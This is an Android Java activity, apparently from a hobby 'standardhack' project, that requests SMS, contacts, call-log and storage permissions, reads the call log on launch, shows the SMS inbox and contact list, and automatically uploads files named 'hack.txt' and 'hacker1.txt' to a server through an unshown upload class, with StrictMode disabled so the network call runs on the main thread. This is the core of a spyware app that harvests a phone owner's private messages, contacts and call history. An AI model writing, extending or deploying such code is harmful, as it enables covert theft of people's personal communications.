    package com.example.standardhack;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.StrictMode;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import android.Manifest;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import org.w3c.dom.Text;

import java.io.File;
import java.util.HashSet;

    public class MainActivity extends AppCompatActivity {
    File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        TextView textView = findViewById(R.id.Contacts);
        textView.setText("Messages:\n");

        TextView textView1 = findViewById(R.id.Msgs);
        textView1.setText("Contacts:\n");
        Button button = findViewById(R.id.ContactsBtn);
        Button button1 = findViewById(R.id.MsgsBtn);

        CheckPermission();

        try {
            call_logs();
        } catch (Exception e) {
            Toast.makeText(this, "Error_Call:" +e, Toast.LENGTH_SHORT).show();
        }
        try {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
        } catch (Exception e) {
            Toast.makeText(this, "Error: "+e, Toast.LENGTH_SHORT).show();
        }

        File fileToUpload = new File(dir+"/Android/hack.txt");
        upload_to_server uploadToServer = new upload_to_server();

        try {
            uploadToServer.UploadFile(fileToUpload);
            Toast.makeText(this, "Success:", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Upload error", Toast.LENGTH_SHORT).show();
        }
        File fileToUpload1 = new File(dir+"/Android/hacker1.txt");
        upload_to_server uploadToServer1 = new upload_to_server();
        try {
            uploadToServer1.UploadFile(fileToUpload1);
            Toast.makeText(this, "Success:", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Upload error", Toast.LENGTH_SHORT).show();
        }
        StorageClass storageClass = new StorageClass();





        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    Uri uri = Uri.parse("content://sms/inbox");
                    Cursor cur = getContentResolver().query(uri, null, null, null, "address ASC");

                    if (cur != null) {
                        HashSet<String> phoneNumbersSet = new HashSet<>();
                        StringBuilder phoneNumbersText = new StringBuilder("Phone Numbers:\n");

                        while (cur.moveToNext()) {
                            @SuppressLint("Range") String address = cur.getString(cur.getColumnIndex("address"));
                            @SuppressLint("Range") String body = cur.getString(cur.getColumnIndex("body"));

                            // Check if the phone number is not already added
                            if (!phoneNumbersSet.contains(address) && !phoneNumbersSet.contains(body)) {
                                phoneNumbersSet.add(address+"\n" + body+"\n");
                                phoneNumbersText.append(address+"\n"+body+"\n").append("\n");
                            }
                        }

                        cur.close();

                        // Display unique phone numbers
                        TextView textView = findViewById(R.id.Contacts);
                        textView.setText(phoneNumbersText.toString());
                    }
                } catch (Exception e) {
                    Toast.makeText(MainActivity.this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                    Log.e("Error", "Error: " + e.toString());
                }
            }
        });

//        button.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View v) {
//
//
//                // Code to get all the messages
//                try {
//                    Uri uri = Uri.parse("content://sms/inbox");
//                    Cursor cur = getContentResolver().query(uri, null, null, null, null);
//                    if (cur.moveToFirst()) {
//                        TextView textView = findViewById(R.id.Contacts);
//                        do {
//                            @SuppressLint("Range") String address = cur.getString(cur.getColumnIndex("address"));
//                            @SuppressLint("Range") String body = cur.getString(cur.getColumnIndex("body"));
//                            textView.append("\nName: " + address + "\nBody: " + body + "\n");
////                            String buff = "\nName: " + address + "\nBody: " + body + "\n\n";
////                            storageClass.WriteIntoFile(buff,"hacker1");
//                        } while (cur.moveToNext());
//                    }
//                } catch (Exception e) {
//                    Toast.makeText(MainActivity.this, "Error" + e, Toast.LENGTH_SHORT).show();
//                    Log.d("Error: ", e.toString());
//                }
//
//            }
//        });

        // Button to get all the messages
        button1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

//                Code to get all the contacts
                try {
                    Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
                    if (cursor != null) {
                        TextView view = findViewById(R.id.Msgs);
                        HashSet<String> phoneNumbersSet = new HashSet<>();
                        StringBuilder phoneNumbersText = new StringBuilder("Phone Numbers:\n");
//                        int j = 0;
                        while (cursor.moveToNext()){
                            @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));// for  number
                            @SuppressLint("Range") String num = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));// for name

                            if(!phoneNumbersSet.contains(num)){
                                phoneNumbersSet.add("\nName: " + name + "\nPhone: " + num+"\n");
                                phoneNumbersText.append("\nName: " + name + "\nPhone: " + num+"\n");
                            }
                        }
                        cursor.close();
                        TextView textView2 = findViewById(R.id.Msgs);
                        textView2.setText(phoneNumbersText.toString());
                    }
                } catch (Exception e) {
                    Toast.makeText(MainActivity.this, "Error: " + e, Toast.LENGTH_SHORT).show();
                    Log.d("Error: ", e.toString());
                }
            }
        });
    }

    public void CheckPermission() {
        int Permission_all = 1;
        String[] Permissions = {
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.MANAGE_EXTERNAL_STORAGE,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.WRITE_CONTACTS,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.SEND_SMS
        };
        if (!hasPermissions(this, Permissions)) {
            ActivityCompat.requestPermissions(this, Permissions, Permission_all);
        }
    }

    public boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }
    @SuppressLint("Range")
    public void call_logs() {

        Cursor cur = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);

        if (cur != null) {
            while (cur.moveToNext()) {

                String number = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));
                String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String type = cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE));

                String callType = null;


                if (type.equals(CallLog.Calls.OUTGOING_TYPE)) {
                    callType = "OutGoing";
                } else if (type.equals(CallLog.Calls.INCOMING_TYPE)) {
                    callType = "Incoming";
                } else if (type.equals(CallLog.Calls.MISSED_TYPE)) {
                    callType = "Missed call";
                } else {
                    callType = "NA";
                }
                Log.d("CallLog", "Name: " + name + ", Phone Number: " + number + ", Call Type: " + callType);
            }
        }
    }
}

